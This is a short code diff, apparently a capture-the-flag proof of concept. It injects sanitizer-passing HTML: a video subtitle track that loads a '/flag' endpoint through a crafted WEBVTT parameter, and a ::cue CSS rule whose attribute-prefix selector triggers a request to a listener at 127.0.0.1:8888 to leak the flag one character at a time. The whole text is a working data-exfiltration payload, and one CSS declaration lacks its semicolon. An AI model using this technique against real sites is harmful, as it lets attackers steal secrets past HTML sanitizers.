@@ -1,0 +1,10 @@
+document.querySelector('article').innerHTML = DOMPurify.sanitize(`
+<video autoplay="" controls="" id="video"><source type="video/mp4" src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/friday.mp4"><track default="" src="/flag?name=WEBVTT%0a00:00.000%20-->%2000:04.000%0a%20-%20<v" srclang="en" kind="subtitles" label="English"> </video>
+<style>
+::cue(v[voice^="n1"]) {
+    background-image: url(http://127.0.0.1:8888/hit?leak=A)
+    font-size: 90px;
+    font-family:poc;
+}
+</style>
+`)
